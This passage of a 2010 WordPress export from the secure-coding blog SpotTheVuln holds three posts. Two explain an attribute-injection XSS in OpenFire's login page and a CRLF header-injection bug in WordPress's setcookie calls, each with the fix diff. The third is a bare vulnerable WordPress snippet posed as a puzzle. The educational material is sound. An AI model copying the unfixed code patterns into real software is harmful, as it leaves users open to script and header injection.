			<wp:comment_date_gmt>2010-10-11 15:30:33</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Spot The Vuln, Spot The Vuln. Spot The Vuln said: New Post: Beer http://spotthevuln.com/2010/10/beer/ [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Beer - XSS</title>
		<link>http://spotthevuln.com/2010/10/beer-xss/</link>
		<pubDate>Fri, 15 Oct 2010 15:00:51 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1158</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: OpenFire

Fixed in Version: 3.7.0b

Issue Type: XSS

Original Code: <a title="Beer" href="http://spotthevuln.com/2010/10/beer/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s bug was an XSS vulnerability caused by the improper escaping of an HTML attribute.  It’s obvious that the developers attempted to protect their software from XSS vulnerabilities.  They even wrote their own XSS sanitizing method (escapeHTMLTags).  The escapeHTMLTags() method is simple, strip out &lt; and &gt; characters and return the string.  Unfortunately, this simple pattern isn’t sufficient in defending against all XSS vulnerabilities.  There is a bit of tracing that is required to understand this bug, so let’s start the tracing.  The bug begins with the following variable assignment:
<blockquote>String username = ParamUtils.getParameter(request, "username");</blockquote>
The username value is assigned directly from the HTTP request.  Later, the username variable is escaped using the custom escapeHTMLTags() function.  The escaping occurs in the following line:
<blockquote>username = org.jivesoftware.util.StringUtils.escapeHTMLTags(username);</blockquote>
Later in the code, the escaped username value is used in the markup as part of an HTML attribute.  The vulnerable line is presented below:
<blockquote>&lt;input size="15" maxlength="50" value="&lt;%= (username != null ? username : "") %&gt;"&gt;</blockquote>
The line above checks to see if the username variable has been assigned a value.  If the username variable contains a value, it is displayed in the markup as the value attribute for an input field.  While sanitizing the &lt; and &gt; characters would prevent an attacker closing the input field and starting a new html tag, it doesn’t prevent an attacker from closing off the attribute value and injecting a new HTML attribute for the input field.  Some consider injection into a input field to be unexploitable (or limited to certain browsers), check out Gareth Heyes blog post about exploiting text fields with new HTML5 events <a href="http://www.thespanner.co.uk/2009/12/06/html5-new-xss-vectors/">http://www.thespanner.co.uk/2009/12/06/html5-new-xss-vectors/</a>
<h2>Developers Solution</h2>
[sourcecode language="diff"]
    /**
     * This method takes a string which may contain HTML tags (ie, &amp;lt;b&amp;gt;,
     * &amp;lt;table&amp;gt;, etc) and converts the '&amp;lt'' and '&amp;gt;' characters to
     * their HTML escape sequences. It will also replace LF  with &amp;lt;br&amp;gt;.
     *
     * @param in the text to be converted.
     * @return the input string with the characters '&amp;lt;' and '&amp;gt;' replaced
     *         with their HTML escape sequences.
     */
    public static String escapeHTMLTags(String in) {
        if (in == null) {
            return null;
        }
        char ch;
        int i = 0;
        int last = 0;
        char[] input = in.toCharArray();
        int len = input.length;
        StringBuilder out = new StringBuilder((int)(len * 1.3));
        for (; i &lt; len; i++) {
            ch = input[i];
            if (ch &gt; '&gt;') {
            }
            else if (ch == '&lt;') {
                if (i &gt; last) {
                    out.append(input, last, i - last);
                }
                last = i + 1;
                out.append(LT_ENCODE);
            }
            else if (ch == '&gt;') {
                if (i &gt; last) {
                    out.append(input, last, i - last);
                }
                last = i + 1;
                out.append(GT_ENCODE);
            }
            else if (ch == '\n') {
                if (i &gt; last) {
                    out.append(input, last, i - last);
                }
                last = i + 1;
                out.append(&quot;&lt;br&gt;&quot;);
            }
        }
        if (last == 0) {
            return in;
        }
        if (i &gt; last) {
            out.append(input, last, i - last);
        }
        return out.toString();
    }

... &lt;snip&gt; ...

&lt;% // get parameters
    String username = ParamUtils.getParameter(request, &quot;username&quot;);

    String password = ParamUtils.getParameter(request, &quot;password&quot;);
    String url = ParamUtils.getParameter(request, &quot;url&quot;);
    url = org.jivesoftware.util.StringUtils.escapeHTMLTags(url);

    // SSO between cluster nodes
    String secret = ParamUtils.getParameter(request, &quot;secret&quot;);
    String nodeID = ParamUtils.getParameter(request, &quot;nodeID&quot;);
    String nonce = ParamUtils.getParameter(request, &quot;nonce&quot;);

    // The user auth token:
    AuthToken authToken = null;

    // Check the request/response for a login token

    Map&lt;String, String&gt; errors = new HashMap&lt;String, String&gt;();

    if (ParamUtils.getBooleanParameter(request, &quot;login&quot;)) {
        String loginUsername = username;
        if (loginUsername != null) {
            loginUsername = JID.escapeNode(loginUsername);
        }
        try {
            if (secret != null &amp;&amp; nodeID != null) {
                if (StringUtils.hash(AdminConsolePlugin.secret).equals(secret) &amp;&amp; ClusterManager.isClusterMember(Base64.decode(nodeID, Base64.URL_SAFE))) {
                    authToken = new AuthToken(loginUsername);
                }
                else if (&quot;clearspace&quot;.equals(nodeID) &amp;&amp; ClearspaceManager.isEnabled()) {
                    ClearspaceManager csmanager = ClearspaceManager.getInstance();
                    String sharedSecret = csmanager.getSharedSecret();
                    if (nonce == null || sharedSecret == null || !csmanager.isValidNonce(nonce) ||
                            !StringUtils.hash(loginUsername + &quot;:&quot; + sharedSecret + &quot;:&quot; + nonce).equals(secret)) {
                        throw new UnauthorizedException(&quot;SSO failed. Invalid secret was provided&quot;);
                    }
                    authToken = new AuthToken(loginUsername);
                }
                else {
                    throw new UnauthorizedException(&quot;SSO failed. Invalid secret or node ID was provided&quot;);
                }
            }
            else {
                // Check that a username was provided before trying to verify credentials
                if (loginUsername != null) {
                    if (LoginLimitManager.getInstance().hasHitConnectionLimit(loginUsername, request.getRemoteAddr())) {
                        throw new UnauthorizedException(&quot;User '&quot; + loginUsername +&quot;' or address '&quot; + request.getRemoteAddr() + &quot;' has his login attempt limit.&quot;);
                    }
                    if (!AdminManager.getInstance().isUserAdmin(loginUsername, true)) {
                        throw new UnauthorizedException(&quot;User '&quot; + loginUsername + &quot;' not allowed to login.&quot;);
                    }
                    authToken = AuthFactory.authenticate(loginUsername, password);
                }
                else {
                    errors.put(&quot;unauthorized&quot;, LocaleUtils.getLocalizedString(&quot;login.failed.unauthorized&quot;));
                }
            }

... &lt;snip&gt; ...

    // Escape HTML tags in username to prevent cross-site scripting attacks. This
    // is necessary because we display the username in the page below.
    username = org.jivesoftware.util.StringUtils.escapeHTMLTags(username);

%&gt;

&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;

&lt;html&gt;
&lt;head&gt;
	&lt;title&gt;&lt;%= AdminConsole.getAppName() %&gt; &lt;fmt:message key=&quot;login.title&quot; /&gt;&lt;/title&gt;
	&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;
		&lt;!--
		// break out of frames
		if (self.parent.frames.length != 0) {
			self.parent.location=document.location;
		}
        function updateFields(el) {
            if (el.checked) {
                document.loginForm.username.disabled = true;
                document.loginForm.password.disabled = true;
            }
            else {
                document.loginForm.username.disabled = false;
                document.loginForm.password.disabled = false;
                document.loginForm.username.focus();
            }
        }
		//--&gt;
	&lt;/script&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;style/global.css&quot; type=&quot;text/css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;style/login.css&quot; type=&quot;text/css&quot;&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;form action=&quot;login.jsp&quot; name=&quot;loginForm&quot; method=&quot;post&quot;&gt;

&lt;%  if (url != null) { try { %&gt;

    &lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;&lt;%= url %&gt;&quot;&gt;

&lt;%  } catch (Exception e) { Log.error(e); } } %&gt;

&lt;input type=&quot;hidden&quot; name=&quot;login&quot; value=&quot;true&quot;&gt;

&lt;div align=&quot;center&quot;&gt;
    &lt;!-- BEGIN login box --&gt;
    &lt;div id=&quot;jive-loginBox&quot;&gt;

        &lt;div align=&quot;center&quot; id=&quot;jive-loginTable&quot;&gt;

            &lt;span id=&quot;jive-login-header&quot; style=&quot;background: transparent url(images/login_logo.gif) no-repeat left; padding: 29px 0 10px 205px;&quot;&gt;
            &lt;fmt:message key=&quot;admin.console&quot; /&gt;
            &lt;/span&gt;

            &lt;div style=&quot;text-align: center; width: 380px;&quot;&gt;
            &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; align=&quot;center&quot;&gt;
                &lt;tr&gt;
                    &lt;td align=&quot;right&quot; class=&quot;loginFormTable&quot;&gt;

                        &lt;table cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;
                        &lt;noscript&gt;
                            &lt;tr&gt;
                                &lt;td colspan=&quot;3&quot;&gt;
                                    &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;
                                    &lt;tr valign=&quot;top&quot;&gt;
                                        &lt;td&gt;&lt;img src=&quot;images/error-16x16.gif&quot; width=&quot;16&quot; height=&quot;16&quot; border=&quot;0&quot; alt=&quot;&quot; vspace=&quot;2&quot;&gt;&lt;/td&gt;
                                        &lt;td&gt;&lt;div class=&quot;jive-error-text&quot; style=&quot;padding-left:5px; color:#cc0000;&quot;&gt;&lt;fmt:message key=&quot;login.error&quot; /&gt;&lt;/div&gt;&lt;/td&gt;
                                    &lt;/tr&gt;
                                    &lt;/table&gt;
                                &lt;/td&gt;
                            &lt;/tr&gt;
                        &lt;/noscript&gt;
                        &lt;%  if (errors.size() &gt; 0) { %&gt;
                            &lt;tr&gt;
                                &lt;td colspan=&quot;3&quot;&gt;
                                    &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;
                                        &lt;% for (String error:errors.values()) { %&gt;
                                    &lt;tr valign=&quot;top&quot;&gt;
                                        &lt;td&gt;&lt;img src=&quot;images/error-16x16.gif&quot; width=&quot;16&quot; height=&quot;16&quot; border=&quot;0&quot; alt=&quot;&quot; vspace=&quot;2&quot;&gt;&lt;/td&gt;
                                        &lt;td&gt;&lt;div class=&quot;jive-error-text&quot; style=&quot;padding-left:5px; color:#cc0000;&quot;&gt;&lt;%= error%&gt;&lt;/div&gt;&lt;/td&gt;
                                    &lt;/tr&gt;
                                        &lt;% } %&gt;
                                    &lt;/table&gt;
                                &lt;/td&gt;
                            &lt;/tr&gt;
                        &lt;%  } %&gt;
                        &lt;tr&gt;
+                           &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;15&quot; maxlength=&quot;50&quot; id=&quot;u01&quot; value=&quot;&lt;%= (username != null ? StringUtils.removeXSSCharacters(username) : &quot;&quot;) %&gt;&quot;&gt;&lt;/td&gt;
-                           &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;15&quot; maxlength=&quot;50&quot; id=&quot;u01&quot; value=&quot;&lt;%= (username != null ? username : &quot;&quot;) %&gt;&quot;&gt;&lt;/td&gt;
                            &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; size=&quot;15&quot; maxlength=&quot;50&quot; id=&quot;p01&quot;&gt;&lt;/td&gt;
                            &lt;td align=&quot;center&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;&amp;nbsp; &lt;fmt:message key=&quot;login.login&quot; /&gt; &amp;nbsp;&quot;&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr valign=&quot;top&quot;&gt;
                            &lt;td class=&quot;jive-login-label&quot;&gt;&lt;label for=&quot;u01&quot;&gt;&lt;fmt:message key=&quot;login.username&quot; /&gt;&lt;/label&gt;&lt;/td&gt;
                            &lt;td class=&quot;jive-login-label&quot;&gt;&lt;label for=&quot;p01&quot;&gt;&lt;fmt:message key=&quot;login.password&quot; /&gt;&lt;/label&gt;&lt;/td&gt;
                            &lt;td&gt;&amp;nbsp;&lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;/table&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                    &lt;td align=&quot;right&quot;&gt;
                        &lt;div align=&quot;right&quot; id=&quot;jive-loginVersion&quot;&gt;
                        &lt;%= AdminConsole.getAppName() %&gt;, &lt;fmt:message key=&quot;login.version&quot; /&gt;: &lt;%= AdminConsole.getVersionString() %&gt;
                        &lt;/div&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
            &lt;/table&gt;
            &lt;/div&gt;
        &lt;/div&gt;

    &lt;/div&gt;
    &lt;!-- END login box --&gt;
&lt;/div&gt;

&lt;/form&gt;

&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;
&lt;!--
    if (document.loginForm.username.value == '')  {
	    document.loginForm.username.focus();
    } else {
        document.loginForm.password.focus();
    }
//--&gt;
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;

[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1158</wp:post_id>
		<wp:post_date>2010-10-15 08:00:51</wp:post_date>
		<wp:post_date_gmt>2010-10-15 15:00:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>beer-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="attribute"><![CDATA[attribute]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="html-tag"><![CDATA[html tag]]></category>
		<category domain="post_tag" nicename="input-field"><![CDATA[input field]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="markup"><![CDATA[markup]]></category>
		<category domain="category" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="strip_tags"><![CDATA[strip_tags]]></category>
		<category domain="post_tag" nicename="vulnerabilities"><![CDATA[vulnerabilities]]></category>
		<category domain="post_tag" nicename="vulnerability"><![CDATA[vulnerability]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/axjOtf]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ab8886ef656695503eb79a40c0b400c0]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>851</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Cross-Site Scripting (XSS), Java, Openfire, Solution Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/10/beer-xss/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-10-17 12:57:21</wp:comment_date>
			<wp:comment_date_gmt>2010-10-17 19:57:21</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by OWASP Feed, Spot The Vuln. Spot The Vuln said: New Post: Beer - XSS http://bit.ly/axjOtf #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Creative</title>
		<link>http://spotthevuln.com/2010/10/creative/</link>
		<pubDate>Mon, 18 Oct 2010 15:00:52 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1164</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>A creative man is motivated by the desire to achieve, not by the desire to beat others.</strong><strong>.
</strong> <strong> -Ayn Rand</strong></blockquote>
<pre lang="php">    
<?php
require( dirname(__FILE__) . '/wp-config.php' );

nocache_headers();

$comment_post_ID = (int) $_POST['comment_post_ID'];

$status = $wpdb->get_row("SELECT post_status, comment_status FROM $wpdb->posts WHERE ID = '$comment_post_ID'");

if ( empty($status->comment_status) ) {
	do_action('comment_id_not_found', $comment_post_ID);
	exit;
} elseif ( 'closed' ==  $status->comment_status ) {
	do_action('comment_closed', $comment_post_ID);
	die( __('Sorry, comments are closed for this item.') );
} elseif ( 'draft' == $status->post_status ) {
	do_action('comment_on_draft', $comment_post_ID);
	exit;
}

$comment_author       = trim($_POST['author']);
$comment_author_email = trim($_POST['email']);
$comment_author_url   = trim($_POST['url']);
$comment_content      = trim($_POST['comment']);

// If the user is logged in
get_currentuserinfo();
if ( $user_ID ) :
	$comment_author       = $wpdb->escape($user_identity);
	$comment_author_email = $wpdb->escape($user_email);
	$comment_author_url   = $wpdb->escape($user_url);
else :
	if ( get_option('comment_registration') )
		die( __('Sorry, you must be logged in to post a comment.') );
endif;

$comment_type = '';

if ( get_settings('require_name_email') && !$user_ID ) {
	if ( 6 > strlen($comment_author_email) || '' == $comment_author )
		die( __('Error: please fill the required fields (name, email).') );
	elseif ( !is_email($comment_author_email))
		die( __('Error: please enter a valid email address.') );
}

if ( '' == $comment_content )
	die( __('Error: please type a comment.') );

$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type', 'user_ID');

wp_new_comment( $commentdata );

if ( !$user_ID ) :
	setcookie('comment_author_' . COOKIEHASH, stripslashes($comment_author), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
	setcookie('comment_author_email_' . COOKIEHASH, stripslashes($comment_author_email), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
	setcookie('comment_author_url_' . COOKIEHASH, stripslashes($comment_author_url), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
endif;

$location = ( empty( $_POST['redirect_to'] ) ) ? get_permalink( $comment_post_ID ) : $_POST['redirect_to']; 

wp_redirect( $location );

?>
</pre>
﻿]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1164</wp:post_id>
		<wp:post_date>2010-10-18 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-10-18 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>creative</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cHytjm]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[00f560e40e652c5ce98871e1373c4d8e]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>876</wp:comment_id>
			<wp:comment_author><![CDATA[Carriage Return/Line Feed (CRLF) Injection, HTTP header injection, PHP, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/10/creative-http-header-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-10-22 11:22:14</wp:comment_date>
			<wp:comment_date_gmt>2010-10-22 18:22:14</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Creative [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Creative - HTTP Header Injection</title>
		<link>http://spotthevuln.com/2010/10/creative-http-header-injection/</link>
		<pubDate>Fri, 22 Oct 2010 18:22:10 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1173</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress

Fixed in Version: 2.1

Issue Type: HTTP Header Injection

Original Code: <a title="Creative" href="http://spotthevuln.com/2010/10/creative/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s bug was a Set-Cookie/HTTP Header injection bug in WordPress Core.  Looking at the code, we see that the WordPress Developers assign several variables directly from the $_POST body.  These assignments are listed below:
<blockquote>$comment_author       = trim($_POST['author']);

$comment_author_email = trim($_POST['email']);

$comment_author_url   = trim($_POST['url']);

$comment_content      = trim($_POST['comment']);</blockquote>
Each of these variables should now be considered tainted and should be sanitized/encoded before using their values in any operations.  It seems that the WordPress developers were aware that the values assigned to the variables listed above could not be trusted and proceeded to escape the values before using them in database related operations.  Some examples of the sanitization can are provided below:
<blockquote>$comment_author       = $wpdb-&gt;escape($user_identity);

$comment_author_email = $wpdb-&gt;escape($user_email);

$comment_author_url   = $wpdb-&gt;escape($user_url);</blockquote>
Unfortunately, the developers utilized the incorrect sanitizing routines for the tainted values in the setcookie API.  The developers used stripslashes() to sanitize the user controlled value before passing it to the setcookie() API.  Although stripslashes can help prevent other types of vulnerabilities, it was not intended to defend against HTTP HEADER injection or cookie poisoning.  By injecting a series of CRLF (%0d%0a) characters, an attacker could use this bug to inject arbitrary headers into the HTTP response and in some cases use this header injection bug for XSS.  The WordPress developers addressed this issue by passing the attacker controlled value to the clean_url() function before allowing it in the setcookie.  The full source for clean_url() can be found <a title="clean_url" href="http://core.trac.wordpress.org/browser/tags/2.9/wp-includes/formatting.php" target="_blank">here</a>, however the more interesting sanitizing routines are provided below:
<blockquote>$url = preg_replace('|[^a-z0-9-~+_.?#=!&amp;;,/:%@$\|*\'()\\x80-\\xff]|i', '', $url);

$strip = array('%0d', '%0a', '%0D', '%0A');

$url = _deep_replace($strip, $url);

$url = str_replace(';//', '://', $url);</blockquote>
<h2>Developers Solution</h2><pre>
[sourcecode language="diff"]
&lt;?php
require( dirname(__FILE__) . '/wp-config.php' );

nocache_headers();

$comment_post_ID = (int) $_POST['comment_post_ID'];

$status = $wpdb-&gt;get_row(&quot;SELECT post_status, comment_status FROM $wpdb-&gt;posts WHERE ID = '$comment_post_ID'&quot;);

if ( empty($status-&gt;comment_status) ) {
	do_action('comment_id_not_found', $comment_post_ID);
	exit;
} elseif ( 'closed' ==  $status-&gt;comment_status ) {
	do_action('comment_closed', $comment_post_ID);
	die( __('Sorry, comments are closed for this item.') );
} elseif ( 'draft' == $status-&gt;post_status ) {
	do_action('comment_on_draft', $comment_post_ID);
	exit;
}

$comment_author       = trim($_POST['author']);
$comment_author_email = trim($_POST['email']);
$comment_author_url   = trim($_POST['url']);
$comment_content      = trim($_POST['comment']);

// If the user is logged in
get_currentuserinfo();
if ( $user_ID ) :
	$comment_author       = $wpdb-&gt;escape($user_identity);
	$comment_author_email = $wpdb-&gt;escape($user_email);
	$comment_author_url   = $wpdb-&gt;escape($user_url);
else :
	if ( get_option('comment_registration') )
		die( __('Sorry, you must be logged in to post a comment.') );
endif;

$comment_type = '';

if ( get_settings('require_name_email') &amp;&amp; !$user_ID ) {
	if ( 6 &gt; strlen($comment_author_email) || '' == $comment_author )
		die( __('Error: please fill the required fields (name, email).') );
	elseif ( !is_email($comment_author_email))
		die( __('Error: please enter a valid email address.') );
}

if ( '' == $comment_content )
	die( __('Error: please type a comment.') );

$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type', 'user_ID');

wp_new_comment( $commentdata );

if ( !$user_ID ) :
	setcookie('comment_author_' . COOKIEHASH, stripslashes($comment_author), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
	setcookie('comment_author_email_' . COOKIEHASH, stripslashes($comment_author_email), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
-	setcookie('comment_author_url_' . COOKIEHASH, stripslashes($comment_author_url), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
+	setcookie('comment_author_url_' . COOKIEHASH, stripslashes(clean_url($comment_author_url)), time() + 30000000, COOKIEPATH, COOKIE_DOMAIN);
endif;

$location = ( empty( $_POST['redirect_to'] ) ) ? get_permalink( $comment_post_ID ) : $_POST['redirect_to']; 

wp_redirect( $location );

?&gt;
[/sourcecode]</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1173</wp:post_id>
		<wp:post_date>2010-10-22 11:22:10</wp:post_date>
		<wp:post_date_gmt>2010-10-22 18:22:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>creative-http-header-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="addslashes"><![CDATA[addslashes]]></category>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="category" nicename="crlf-injection"><![CDATA[Carriage Return/Line Feed (CRLF) Injection]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="http-header-injection"><![CDATA[HTTP header injection]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9duePL]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[91d82e68df7d2d840999922d092d8b6a]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>884</wp:comment_id>
